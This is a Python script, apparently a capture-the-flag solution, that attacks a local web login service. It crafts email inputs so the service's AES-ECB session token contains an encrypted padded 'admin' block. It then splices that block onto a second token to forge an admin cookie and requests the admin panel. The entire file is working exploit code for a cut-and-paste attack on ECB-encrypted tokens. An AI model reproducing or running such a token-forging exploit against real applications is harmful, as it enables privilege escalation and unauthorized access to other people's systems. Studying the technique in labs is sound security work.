import requests
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES

# URL Endpoints
LOGIN_URL = 'http://localhost:1997/login'
ADMIN_URL = 'http://localhost:1997/admin'

# Helper function to build the payload
def build_payload(email, username="spark", password="password"):
    return {
        "email": email,
        "username": username,
        "password": password,
    }

# Helper function to extract token blocks
def extract_blocks(token, block_size=16):
    return [token[i:i+block_size] for i in range(0, len(token), block_size)]

# Step 1: Create padded email for initial request
postfix = b'@gmail.com'  # Fixed postfix for email
email_prefix_length = 16 - len("email=") - len(postfix)  # Calculate padding length

to_enc = pad(b"admin", 16)  # Pad the "admin" string to match block size
email = b'A' * email_prefix_length + postfix + to_enc  # Construct the email

# Build initial payload and send request
data = build_payload(email.decode())
session = requests.Session()
response = session.post(LOGIN_URL, data=data)
print("Initial Response:", response.text)

# Step 2: Extract token and isolate target block
token = bytes.fromhex(session.cookies.get('token'))
print(f'Token: {token}')
enc_blocks = extract_blocks(token)
target_block = enc_blocks[1]  # Target the second block

# Step 3: Create a new email and send a second request to get a new token
email = "aaaaaaaaaaa@gmail.com"  # Another email to match padding
payload = build_payload(email)
response = session.post(LOGIN_URL, data=payload)

# Extract token blocks from the second response
token = bytes.fromhex(session.cookies.get('token'))
enc_blocks = extract_blocks(token)

# Step 4: Construct exploit token
exploit = b"".join(enc_blocks[:-1]) + target_block
print(f'Exploit: {exploit.hex()}')

# Step 5: Use the exploit token to access the admin panel
session.cookies.set('token', exploit.hex())
response = session.get(ADMIN_URL)
print("Admin Response:", response.text)
